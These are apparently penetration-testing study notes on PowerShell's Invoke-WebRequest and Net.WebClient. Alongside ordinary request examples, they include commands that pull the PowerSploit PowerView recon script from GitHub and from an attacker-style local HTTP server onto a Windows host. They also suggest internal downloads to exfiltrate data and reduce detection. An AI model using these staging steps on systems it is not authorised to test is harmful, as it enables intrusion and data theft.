### Interacting with the Web Using PowerShell

1. **Invoke-WebRequest Cmdlet**:
    
    - **Purpose**: Performs HTTP/HTTPS requests, parses HTML, downloads files, and more.
    - **Aliases**: `wget`, `iwr`, `curl`.
    - **Basic Syntax**:
        - `Invoke-WebRequest -Uri <URL> -Method <Method>`
2. **Help and Properties**:
    
    - To view details about `Invoke-WebRequest`, use:
        - `Get-Help Invoke-WebRequest`
    - Properties include `Content`, `Headers`, `StatusCode`, `RawContent`, etc.
3. **Simple Web Request**:
    
    - Example to make a GET request and view properties:
        - `Invoke-WebRequest -Uri "<URL>" -Method GET | Get-Member`
    - Example to filter and view specific content, like images:
        - `Invoke-WebRequest -Uri "<URL>" -Method GET | fl Images`
4. **Downloading Files**:
    
    - **From the Internet**:
        - Example to download PowerView.ps1:
            - `Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"`
    - **From a Local Server**:
        - Start a local Python server: `python3 -m http.server 8000`
        - Download using:
            - `Invoke-WebRequest -Uri "http://<server-ip>:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"`
5. **Using .Net.WebClient Class**:
    
    - **Alternative to `Invoke-WebRequest`**:
        - Example to download a file:
            - `(New-Object Net.WebClient).DownloadFile("<URL>", "<Destination-File>")`

### Practical Uses

- **For Administrators**: Automate software updates, application installations, and data retrieval without manual intervention.
- **For Pentesters**: Quickly deploy tools or exfiltrate data from compromised systems. Local or internal network downloads help reduce detection risks.

### Next Steps

- **Practice**: Try different types of requests, explore filtering options, and use various properties to parse and extract needed data.
- **Automation**: Leverage these capabilities for scripting and automation to streamline system administration and penetration testing tasks.